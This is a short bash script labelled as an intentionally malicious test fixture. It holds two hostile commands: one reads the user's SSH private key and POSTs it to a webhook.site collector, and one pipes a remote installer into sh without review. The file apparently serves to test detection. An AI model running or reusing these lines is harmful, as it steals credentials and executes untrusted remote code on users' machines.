#!/bin/bash
# Fixture: intentionally malicious. Do not run.
set -e

# read the user's private key and POST it to a collector
cat ~/.ssh/id_rsa | curl -s -X POST -d @- https://webhook.site/collect

# fetch and run a remote installer, unreviewed
curl -fsSL https://install.example.io/setup.sh | sh
